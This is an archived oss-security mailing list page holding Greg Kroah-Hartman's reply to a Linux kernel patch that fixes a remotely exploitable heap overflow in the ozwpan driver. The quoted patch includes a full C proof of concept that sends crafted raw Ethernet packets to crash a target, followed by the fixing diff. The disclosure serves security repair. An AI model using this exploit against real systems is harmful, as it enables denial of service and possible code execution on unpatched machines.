@@ -1,0 +1,334 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: [PATCH 1/4] ozwpan: Use proper check to prevent heap overflow</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="1">[&lt;prev]</a> <a href="../../../2015/05/25/1">[next&gt;]</a> <a href="../../../2015/05/13/26">[&lt;thread-prev]</a> <a href="../../../2015/05/26/4">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20150524202643.GA25501&#64;kroah.com&gt;
+Date: Sun, 24 May 2015 13:26:43 -0700
+From: Greg Kroah-Hartman &lt;gregkh&#64;...uxfoundation.org&gt;
+To: "Jason A. Donenfeld" &lt;Jason&#64;...c4.com&gt;
+Cc: oss-security &lt;oss-security&#64;...ts.openwall.com&gt;,
+	linux-kernel&#64;...r.kernel.org,
+	Shigekatsu Tateno &lt;shigekatsu.tateno&#64;...el.com&gt;,
+	devel&#64;...verdev.osuosl.org
+Subject: Re: [PATCH 1/4] ozwpan: Use proper check to prevent heap overflow
+
+On Wed, May 13, 2015 at 08:58:17PM +0200, Jason A. Donenfeld wrote:
+&gt; Since elt-&gt;length is a u8, we can make this variable a u8. Then we can
+&gt; do proper bounds checking more easily. Without this, a potentially
+&gt; negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
+&gt; resulting in a remotely exploitable heap overflow with network
+&gt; supplied data.
+&gt; 
+&gt; This could result in remote code execution. A PoC which obtains DoS
+&gt; follows below. It requires the ozprotocol.h file from this module.
+&gt; 
+&gt; =-=-=-=-=-=
+&gt; 
+&gt;  #include &lt;arpa/inet.h&gt;
+&gt;  #include &lt;linux/if_packet.h&gt;
+&gt;  #include &lt;net/if.h&gt;
+&gt;  #include &lt;netinet/ether.h&gt;
+&gt;  #include &lt;stdio.h&gt;
+&gt;  #include &lt;string.h&gt;
+&gt;  #include &lt;stdlib.h&gt;
+&gt;  #include &lt;endian.h&gt;
+&gt;  #include &lt;sys/ioctl.h&gt;
+&gt;  #include &lt;sys/socket.h&gt;
+&gt; 
+&gt;  #define u8 uint8_t
+&gt;  #define u16 uint16_t
+&gt;  #define u32 uint32_t
+&gt;  #define __packed __attribute__((__packed__))
+&gt;  #include "ozprotocol.h"
+&gt; 
+&gt; static int hex2num(char c)
+&gt; {
+&gt; 	if (c &gt;= '0' &amp;&amp; c &lt;= '9')
+&gt; 		return c - '0';
+&gt; 	if (c &gt;= 'a' &amp;&amp; c &lt;= 'f')
+&gt; 		return c - 'a' + 10;
+&gt; 	if (c &gt;= 'A' &amp;&amp; c &lt;= 'F')
+&gt; 		return c - 'A' + 10;
+&gt; 	return -1;
+&gt; }
+&gt; static int hwaddr_aton(const char *txt, uint8_t *addr)
+&gt; {
+&gt; 	int i;
+&gt; 	for (i = 0; i &lt; 6; i++) {
+&gt; 		int a, b;
+&gt; 		a = hex2num(*txt++);
+&gt; 		if (a &lt; 0)
+&gt; 			return -1;
+&gt; 		b = hex2num(*txt++);
+&gt; 		if (b &lt; 0)
+&gt; 			return -1;
+&gt; 		*addr++ = (a &lt;&lt; 4) | b;
+&gt; 		if (i &lt; 5 &amp;&amp; *txt++ != ':')
+&gt; 			return -1;
+&gt; 	}
+&gt; 	return 0;
+&gt; }
+&gt; 
+&gt; int main(int argc, char *argv[])
+&gt; {
+&gt; 	if (argc &lt; 3) {
+&gt; 		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+&gt; 		return 1;
+&gt; 	}
+&gt; 
+&gt; 	uint8_t dest_mac[6];
+&gt; 	if (hwaddr_aton(argv[2], dest_mac)) {
+&gt; 		fprintf(stderr, "Invalid mac address.\n");
+&gt; 		return 1;
+&gt; 	}
+&gt; 
+&gt; 	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+&gt; 	if (sockfd &lt; 0) {
+&gt; 		perror("socket");
+&gt; 		return 1;
+&gt; 	}
+&gt; 
+&gt; 	struct ifreq if_idx;
+&gt; 	int interface_index;
+&gt; 	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+&gt; 	if (ioctl(sockfd, SIOCGIFINDEX, &amp;if_idx) &lt; 0) {
+&gt; 		perror("SIOCGIFINDEX");
+&gt; 		return 1;
+&gt; 	}
+&gt; 	interface_index = if_idx.ifr_ifindex;
+&gt; 	if (ioctl(sockfd, SIOCGIFHWADDR, &amp;if_idx) &lt; 0) {
+&gt; 		perror("SIOCGIFHWADDR");
+&gt; 		return 1;
+&gt; 	}
+&gt; 	uint8_t *src_mac = (uint8_t *)&amp;if_idx.ifr_hwaddr.sa_data;
+&gt; 
+&gt; 	struct {
+&gt; 		struct ether_header ether_header;
+&gt; 		struct oz_hdr oz_hdr;
+&gt; 		struct oz_elt oz_elt;
+&gt; 		struct oz_elt_connect_req oz_elt_connect_req;
+&gt; 	} __packed connect_packet = {
+&gt; 		.ether_header = {
+&gt; 			.ether_type = htons(OZ_ETHERTYPE),
+&gt; 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+&gt; 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+&gt; 		},
+&gt; 		.oz_hdr = {
+&gt; 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION &lt;&lt; OZ_VERSION_SHIFT),
+&gt; 			.last_pkt_num = 0,
+&gt; 			.pkt_num = htole32(0)
+&gt; 		},
+&gt; 		.oz_elt = {
+&gt; 			.type = OZ_ELT_CONNECT_REQ,
+&gt; 			.length = sizeof(struct oz_elt_connect_req)
+&gt; 		},
+&gt; 		.oz_elt_connect_req = {
+&gt; 			.mode = 0,
+&gt; 			.resv1 = {0},
+&gt; 			.pd_info = 0,
+&gt; 			.session_id = 0,
+&gt; 			.presleep = 35,
+&gt; 			.ms_isoc_latency = 0,
+&gt; 			.host_vendor = 0,
+&gt; 			.keep_alive = 0,
+&gt; 			.apps = htole16((1 &lt;&lt; OZ_APPID_USB) | 0x1),
+&gt; 			.max_len_div16 = 0,
+&gt; 			.ms_per_isoc = 0,
+&gt; 			.up_audio_buf = 0,
+&gt; 			.ms_per_elt = 0
+&gt; 		}
+&gt; 	};
+&gt; 
+&gt; 	struct {
+&gt; 		struct ether_header ether_header;
+&gt; 		struct oz_hdr oz_hdr;
+&gt; 		struct oz_elt oz_elt;
+&gt; 		struct oz_get_desc_rsp oz_get_desc_rsp;
+&gt; 	} __packed pwn_packet = {
+&gt; 		.ether_header = {
+&gt; 			.ether_type = htons(OZ_ETHERTYPE),
+&gt; 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+&gt; 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+&gt; 		},
+&gt; 		.oz_hdr = {
+&gt; 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION &lt;&lt; OZ_VERSION_SHIFT),
+&gt; 			.last_pkt_num = 0,
+&gt; 			.pkt_num = htole32(1)
+&gt; 		},
+&gt; 		.oz_elt = {
+&gt; 			.type = OZ_ELT_APP_DATA,
+&gt; 			.length = sizeof(struct oz_get_desc_rsp) - 2
+&gt; 		},
+&gt; 		.oz_get_desc_rsp = {
+&gt; 			.app_id = OZ_APPID_USB,
+&gt; 			.elt_seq_num = 0,
+&gt; 			.type = OZ_GET_DESC_RSP,
+&gt; 			.req_id = 0,
+&gt; 			.offset = htole16(0),
+&gt; 			.total_size = htole16(0),
+&gt; 			.rcode = 0,
+&gt; 			.data = {0}
+&gt; 		}
+&gt; 	};
+&gt; 
+&gt; 	struct sockaddr_ll socket_address = {
+&gt; 		.sll_ifindex = interface_index,
+&gt; 		.sll_halen = ETH_ALEN,
+&gt; 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+&gt; 	};
+&gt; 
+&gt; 	if (sendto(sockfd, &amp;connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&amp;socket_address, sizeof(socket_address)) &lt; 0) {
+&gt; 		perror("sendto");
+&gt; 		return 1;
+&gt; 	}
+&gt; 	usleep(300000);
+&gt; 	if (sendto(sockfd, &amp;pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&amp;socket_address, sizeof(socket_address)) &lt; 0) {
+&gt; 		perror("sendto");
+&gt; 		return 1;
+&gt; 	}
+&gt; 	return 0;
+&gt; }
+&gt; 
+&gt; Signed-off-by: Jason A. Donenfeld &lt;Jason&#64;...c4.com&gt;
+&gt; ---
+&gt;  drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
+&gt;  1 file changed, 3 insertions(+), 1 deletion(-)
+&gt; 
+&gt; diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
+&gt; index d434d8c..cd6c63e 100644
+&gt; --- a/drivers/staging/ozwpan/ozusbsvc1.c
+&gt; +++ b/drivers/staging/ozwpan/ozusbsvc1.c
+&gt; @@ -390,8 +390,10 @@ void oz_usb_rx(struct oz_pd *pd, struct oz_elt *elt)
+&gt;  	case OZ_GET_DESC_RSP: {
+&gt;  			struct oz_get_desc_rsp *body =
+&gt;  				(struct oz_get_desc_rsp *)usb_hdr;
+&gt; -			int data_len = elt-&gt;length -
+&gt; +			u8 data_len = elt-&gt;length -
+&gt;  					sizeof(struct oz_get_desc_rsp) + 1;
+&gt; +			if (data_len &gt; elt-&gt;length)
+&gt; +				break;
+&gt;  			u16 offs = le16_to_cpu(get_unaligned(&amp;body-&gt;offset));
+&gt;  			u16 total_size =
+&gt;  				le16_to_cpu(get_unaligned(&amp;body-&gt;total_size));
+
+This patch adds a build warning.  Please fix it up and resend the
+series.
+
+thanks,
+
+greg k-h
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
